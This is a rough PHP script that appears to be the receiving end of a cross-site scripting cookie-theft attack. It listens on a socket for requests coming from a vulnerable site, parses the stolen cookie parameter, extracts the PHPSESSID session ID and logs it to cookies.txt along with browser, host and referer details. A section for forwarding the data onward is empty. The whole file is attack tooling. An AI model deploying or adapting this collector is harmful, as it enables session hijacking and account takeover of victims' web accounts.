<?
##put info a loop whole stuff

// set some variables
$host = "localhost";
/*****  GETTING INFO FROM VULNARABLE WEB SITE  ******/
$port = 6003;
echo "listening socket..\n";
// don’t timeout!
set_time_limit(0);

// create socket
$socket = socket_create(AF_INET, SOCK_STREAM, 0) or die("Could not create socketn");
// bind socket to port
$result = socket_bind($socket, $host, $port) or die("Could not bind to socketn");
// start listening for connections
$result = socket_listen($socket, 3) or die("Could not set up socket listenern");
// accept incoming connections

// spawn another socket to handle communication
$spawn = socket_accept($socket) or die("Could not accept incoming connectionn");

// read client input
$input = socket_read($spawn, 1024) or die("Could not read inputn");
echo "\ninput is: \n";
echo $input;
$urlline = "";
$clientIPAddr = "";
$clientPort = "";
$browserInfo = "";
$clientOS = "";
$referer = "";
$date = "111";


//todo: read first line
foreach(preg_split("/((\r?\n)|(\r\n?))/", $input) as $line){
    if(strpos($line, 'GET /') !== false)
    {
       $urlline = $line;
    }
    else if(strpos($line, 'Host') !== false)
    {
        //get client port, parse localhost
        $clientPort = $line;
    }
    else if(strpos($line, 'User-Agent') !== false)
    {
        //get browser and OS info
        $browserInfo = $line;
        $clientOS = $line;
    }
    else if(strpos($line, 'Origin') !== false)
    {
        //get referer
        $referer = $line;
    }
}
echo "\n";

//todo: parse by &
trim($urlline);
echo "\n\nfields are: \n";
echo $urlline;
echo "\n";
parse_str($urlline);
//echo "\nsession ID:\n";
//echo $sessionID;

#GET cookie
echo "\ncookie:\n";
echo $cookie;
echo "\n\n";


#GET Session ID
$sessionID = "";
$cookiearray = explode(';', $cookie);
	//get session id from cookies
        for($i=0; $i<count($cookiearray); $i++){
           $name = explode('=', $cookiearray[$i])[0];
           $value = explode('=', $cookiearray[$i])[1];
           echo "\n===> " . $name . " : " . $value . "\n";
	         if($name == "PHPSESSID"){
		            $sessionID = $value;
		            break;
	        }
       }
echo "sessionID: ";
echo $sessionID;
echo "\n";

//todo: echo fields

//todo:store them to show in a webpage

$myfile = fopen("cookies.txt", "w") or die("Unable to open file!");

fwrite($myfile, "td1==>");
fwrite($myfile, $clientIPAddr);
fwrite($myfile,"\n");
fwrite($myfile, "td2==>");
fwrite($myfile, $clientPort);
fwrite($myfile,"\n");
fwrite($myfile, "td3==>");
fwrite($myfile, $browserInfo);
fwrite($myfile,"\n");
fwrite($myfile, "td4==>");
fwrite($myfile, $clientOS);
fwrite($myfile,"\n");
fwrite($myfile, "td5==>");
fwrite($myfile, $referer);
fwrite($myfile,"\n");
fwrite($myfile, "td6==>");
fwrite($myfile, $sessionID);
fwrite($myfile,"\n");
fwrite($myfile, "td7==>");
fwrite($myfile, $cookie);
fwrite($myfile,"\n");
fwrite($myfile, "td8==>");
fwrite($myfile, $date);
fwrite($myfile,"\n");
fclose($myfile);


/*****  SENDING INFO TO OUR WEBPAGE ******/






// close sockets
socket_close($spawn);
socket_close($socket);
?>
